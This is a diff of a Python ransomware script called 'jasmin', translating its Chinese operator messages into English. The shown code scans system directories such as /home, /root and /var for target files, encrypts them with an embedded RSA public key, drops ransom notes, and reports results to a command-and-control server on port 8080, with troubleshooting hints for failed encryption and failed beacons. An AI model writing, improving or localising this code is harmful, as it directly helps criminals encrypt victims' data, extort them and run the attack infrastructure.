@@ -26,7 +26,7 @@ def _has_openssl():
 
 HAS_OPENSSL=_has_openssl()
 if not USE_LIB and not HAS_OPENSSL:
-    sys.stderr.write('[!] 无cryptography库且无openssl命令，无法运行\n');sys.exit(1)
+    sys.stderr.write('[!] Neither the cryptography library nor the openssl command is available, cannot run\n');sys.exit(1)
 
 import tempfile as _tf
 
@@ -42,18 +42,18 @@ SELF=os.path.basename(__file__) if '__file__' in globals() else '-'
 FAILS={}   # 原因文案 -> [次数, 首个样例路径]
 
 _EMAP={
-    errno.ENOSPC:'磁盘空间不足 (ENOSPC) — 加密需为每个文件额外生成等大的 .jasmin，需要与被加密数据等量的空闲空间',
-    errno.EDQUOT:'磁盘配额超限 (EDQUOT) — 用户/组配额已满',
-    errno.EROFS:'只读文件系统 (EROFS) — 目标目录所在挂载点不可写',
-    errno.EACCES:'权限不足 (EACCES) — 当前用户无权在该目录创建文件',
-    errno.EPERM:'权限不足 (EPERM)',
-    errno.EMFILE:'进程打开文件数超限 (EMFILE) — ulimit -n 太小',
-    errno.ENFILE:'系统打开文件数超限 (ENFILE)',
-    errno.ENAMETOOLONG:'路径名过长 (ENAMETOOLONG)',
-    errno.ELOOP:'符号链接层数过多 (ELOOP)',
-    errno.EISDIR:'目标被识别为目录 (EISDIR)',
-    errno.EXDEV:'跨设备链接 (EXDEV)',
-    errno.ENOMEM:'内存不足 (ENOMEM) — 系统内存/swap 耗尽',
+    errno.ENOSPC:'Insufficient disk space (ENOSPC) - each file needs an equally sized .jasmin copy; free space equal to the target data is required',
+    errno.EDQUOT:'Disk quota exceeded (EDQUOT) - user/group quota is full',
+    errno.EROFS:'Read-only filesystem (EROFS) - the mount point holding the target directory is not writable',
+    errno.EACCES:'Permission denied (EACCES) - the current user cannot create files in that directory',
+    errno.EPERM:'Permission denied (EPERM)',
+    errno.EMFILE:'Too many open files (EMFILE) - ulimit -n is too low',
+    errno.ENFILE:'Too many open files system-wide (ENFILE)',
+    errno.ENAMETOOLONG:'File name too long (ENAMETOOLONG)',
+    errno.ELOOP:'Too many levels of symbolic links (ELOOP)',
+    errno.EISDIR:'Target is a directory (EISDIR)',
+    errno.EXDEV:'Cross-device link (EXDEV)',
+    errno.ENOMEM:'Out of memory (ENOMEM) - system memory/swap exhausted',
 }
 
 def _why(e):
@@ -69,11 +69,11 @@ def _note_fail(e,path):
 def _report_fails():
     if not FAILS:return
     total=sum(v[0] for v in FAILS.values())
-    sys.stderr.write('[jasmin] !!! 有 %d 个文件加密失败，原因统计:\n'%total)
+    sys.stderr.write('[jasmin] !!! %d file(s) failed to encrypt. Reason breakdown:\n'%total)
     for k,v in sorted(FAILS.items(),key=lambda x:-x[1][0]):
-        sys.stderr.write('[jasmin] !!!   %d 次 — %s\n'%(v[0],k))
-        sys.stderr.write('[jasmin] !!!       例如: %s\n'%v[1])
-    sys.stderr.write('[jasmin] !!! 自查: 可用空间(df -h)、inode(df -i)、目录可写性、ulimit -n\n')
+        sys.stderr.write('[jasmin] !!!   %d time(s) - %s\n'%(v[0],k))
+        sys.stderr.write('[jasmin] !!!       e.g. %s\n'%v[1])
+    sys.stderr.write('[jasmin] !!! Check: free space (df -h), inodes (df -i), directory writability, ulimit -n\n')
 
 def skip(p):
     fp=os.path.abspath(p)
@@ -196,9 +196,9 @@ def drop_notes(dirs,sid):
                 written+=1
             except Exception as e:
                 wfails[_why(e)]=wfails.get(_why(e),0)+1
-    sys.stderr.write('[jasmin] 勒索信已投放 %d 处\n'%written)
+    sys.stderr.write('[jasmin] Ransom note dropped in %d location(s)\n'%written)
     for k,v in wfails.items():
-        sys.stderr.write('[jasmin] !!! 勒索信有 %d 处投放失败 — %s\n'%(v,k))
+        sys.stderr.write('[jasmin] !!! Ransom note failed to drop in %d location(s) - %s\n'%(v,k))
 
 # ────────────────────────────────────────
 # 进度条
@@ -231,8 +231,8 @@ def preflight(roots,need_bytes,need_files):
         except Exception:pass
         if warn:
             for w in warn:
-                sys.stderr.write('[jasmin] !!! 空间预检警告: %s\n'%w)
-            sys.stderr.write('[jasmin] !!! 继续执行，但加密很可能大面积失败。建议先清理磁盘/换分区，或改用 ~/.ssh 之外的可写大盘。\n')
+                sys.stderr.write('[jasmin] !!! Preflight warning: %s\n'%w)
+            sys.stderr.write('[jasmin] !!! Continuing, but encryption will very likely fail at scale. Free up space or switch to another writable volume first.\n')
     except Exception:pass
 
 def scan_targets(roots):
@@ -324,9 +324,9 @@ def beacon(sid,stats=None,prog=None):
         urllib.request.urlopen(req,timeout=10)
     except Exception as e:
         # 不再静默：否则回连失败时后台永远没有数据，用户完全无从判断
-        sys.stderr.write('[jasmin] !!! 上报失败: %s\n'%C2)
-        sys.stderr.write('[jasmin] !!! 原因: %s\n'%e)
-        sys.stderr.write('[jasmin] !!! 请检查回连地址是否可达、端口是否正确(本服务在 :8080)、握手密钥是否与后台一致\n')
+        sys.stderr.write('[jasmin] !!! Beacon failed: %s\n'%C2)
+        sys.stderr.write('[jasmin] !!! Reason: %s\n'%e)
+        sys.stderr.write('[jasmin] !!! Check that the C2 URL is reachable, the port is correct (this service listens on :8080), and the handshake secret matches the panel.\n')
 
 def main():
     pub_obj=None;pub_pem_path=None
@@ -334,7 +334,7 @@ def main():
         try:
             pub_obj=serialization.load_pem_public_key(RSA_PUB,default_backend())
         except Exception as e:
-            sys.stderr.write('[jasmin] !!! 公钥加载失败，无法加密: %s\n'%e);sys.exit(2)
+            sys.stderr.write('[jasmin] !!! Failed to load the public key, cannot encrypt: %s\n'%e);sys.exit(2)
     else:
         td=_tf.mkdtemp();pub_pem_path=os.path.join(td,'pub.pem')
         open(pub_pem_path,'wb').write(RSA_PUB)
@@ -342,11 +342,11 @@ def main():
     roots=['/home','/root','/var','/opt','/tmp','/srv']
 
     # ── 阶段1: 预扫描（统计总数，用于进度条分母） ──
-    sys.stderr.write('[jasmin] 正在扫描目标文件...\n')
+    sys.stderr.write('[jasmin] Scanning for target files...\n')
     n_total,b_total=scan_targets(roots)
-    sys.stderr.write('[jasmin] 发现 %d 个目标文件，合计 %s\n'%(n_total,_fmt_b(b_total)))
+    sys.stderr.write('[jasmin] Found %d target file(s), %s total\n'%(n_total,_fmt_b(b_total)))
     if n_total==0:
-        sys.stderr.write('[jasmin] 提示: 未发现匹配的目标文件。可用扩展名白名单见脚本 EXTS，跳过目录见 SKIP_DIRS。\n')
+        sys.stderr.write('[jasmin] Note: no matching target files found. See EXTS for the extension whitelist, SKIP_DIRS for skipped directories.\n')
 
     preflight(roots,b_total,n_total)   # 空间/inode 预检
 
@@ -375,7 +375,7 @@ def main():
                             if e not in stats['detail']:stats['detail'][e]={'count':0,'size':0}
                             stats['detail'][e]['count']+=1;stats['detail'][e]['size']+=sz
         finish()
-        sys.stderr.write('[jasmin] 加密完成: %d/%d 个文件, %s / %s\n'%(stats['count'],n_total,_fmt_b(stats['size']),_fmt_b(b_total)))
+        sys.stderr.write('[jasmin] Encryption complete: %d/%d file(s), %s / %s\n'%(stats['count'],n_total,_fmt_b(stats['size']),_fmt_b(b_total)))
         _report_fails()   # 失败必须可见，否则无从定位
 
     note_dirs=set(roots);note_dirs.add(os.path.expanduser('~'))
